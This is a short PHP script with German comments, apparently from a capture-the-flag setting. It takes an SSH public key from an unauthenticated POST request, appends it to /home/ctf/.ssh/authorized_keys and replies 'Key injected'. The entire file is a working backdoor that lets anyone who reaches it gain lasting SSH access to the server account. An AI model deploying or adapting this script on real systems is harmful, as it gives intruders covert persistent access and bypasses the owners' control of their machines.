<?php
// erwartet POST-Parameter “key”
if (isset($_POST['key'])) {
    // SSH-Key ans Ende von authorized_keys hängen
    file_put_contents('/home/ctf/.ssh/authorized_keys', trim($_POST['key'])."\n", FILE_APPEND|LOCK_EX);

    echo "Key injected";
} else {
    echo "No key provided";
}
